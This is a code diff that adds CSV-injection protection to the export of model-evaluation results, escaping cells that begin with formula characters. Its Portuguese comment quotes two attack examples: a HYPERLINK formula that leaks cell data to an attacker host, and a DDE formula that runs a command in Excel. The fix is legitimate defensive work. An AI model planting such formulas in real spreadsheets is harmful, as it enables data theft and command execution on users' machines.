@@ -134,17 +134,36 @@ async def compare_results(
 _MAX_PAGE_SIZE = 200
 
 
+# Caracteres que fazem Excel/Google Sheets/LibreOffice tratarem a célula como
+# FÓRMULA. O conteúdo do export não é confiável: `input`/`expected_output` vêm
+# do dataset enviado pelo usuário e `actual_output`/`judge_reasoning` vêm da
+# SAÍDA DO MODELO avaliado (que o dataset influencia). Um `=HYPERLINK(
+# "http://atacante/?"&A1,"clique")` numa célula exfiltra as outras ao abrir a
+# planilha, e `=cmd|' /C calc'!A0` executa comando via DDE no Excel — CSV
+# injection clássico. O apóstrofo é o marcador de "texto" das planilhas: o
+# valor continua legível (a célula o mostra sem o apóstrofo) e nunca é avaliado.
+_FORMULA_LEADING_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_text(value: str) -> str:
+    """Neutraliza texto que a planilha executaria como fórmula (CSV injection)."""
+    return f"'{value}" if value.startswith(_FORMULA_LEADING_CHARS) else value
+
+
 def _csv_value(result: EvaluationResult, sample: Sample | None, column: str) -> str:
     """Valor de uma célula do export, com None como célula vazia e score com 4 casas."""
     if column in ("input", "expected_output"):
-        return (getattr(sample, column) if sample is not None else None) or ""
+        value = (getattr(sample, column) if sample is not None else None) or ""
+        return _csv_text(value)
     if column in _SCORE_FIELDS:
         value = getattr(result, column)
         return "" if value is None else f"{value:.4f}"
     if column == "sample_id":
         return str(result.sample_id)
     if column == "judge_reasoning":
-        return result.judge_reasoning or ""
+        return _csv_text(result.judge_reasoning or "")
+    if column == "actual_output":
+        return _csv_text(result.actual_output or "")
     return str(getattr(result, column))
 
 
